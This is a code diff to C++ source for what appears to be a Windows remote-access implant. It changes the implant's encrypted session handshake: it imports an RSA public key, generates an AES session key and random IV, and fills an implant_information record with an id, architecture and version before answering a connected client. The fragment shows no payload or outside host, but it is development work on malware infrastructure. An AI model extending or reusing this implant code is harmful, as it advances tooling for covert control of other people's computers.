@@ -1,11 +1,13 @@
 #include <Windows.h>
 #include <vector>
-#include <structs.h>
 #include <globalvars.h>
 #include <string> 
 #include <rsa.h>
 #include <AES.h>
 #include <random>
+
+extern CONFIG g_conf;
+unsigned char pubkey[283] = { 'R','S','A','1' };
 
 BOOL check_connection(int bytes) {
 	if (bytes == -1) {
@@ -25,7 +27,7 @@ std::vector<UCHAR> geneate_random(int len) {
 	}
 	return array;
 }
-void main_dispatcher(SOCKET s) {
+void main_dispatcher(SOCKET client_socket) {
 	BCRYPT_ALG_HANDLE hAlgorithm = 0;
 	BCRYPT_KEY_HANDLE key = 0;
 
@@ -34,8 +36,6 @@ void main_dispatcher(SOCKET s) {
 
 	BCryptOpenAlgorithmProvider(&hAlgorithm, BCRYPT_RSA_ALGORITHM, MS_PRIMITIVE_PROVIDER, 0);
 	import_pubkey(hAlgorithm, (unsigned char*)pubkey, sizeof(pubkey), &key);
-
-	SOCKET client_socket = accept(s, (struct sockaddr*)&client, &client_size);
 
 	HELLOREQUEST inital_request;
 	int recv_bytes = recv(client_socket, (char*)&inital_request, sizeof(HELLOREQUEST), 0);
@@ -53,8 +53,9 @@ void main_dispatcher(SOCKET s) {
 			std::vector<UCHAR> iv = geneate_random(16);
 
 			AES aes(AESKeyLength::AES_256);
-			implant_information.implant_arch = 0x8;
-			implant_information.implant_id = 0x77;
+			implant_information.implant_arch = IMPLANT_ARCH;
+			implant_information.platform_arch = 0x8;
+			implant_information.implant_id = g_conf.id;
 			implant_information.implant_platform = 0x8;
 			implant_information.implant_version = IMPLANT_VERSION;
 			memcpy(implant_information.session_key, aes_key.data(), aes_key.size());
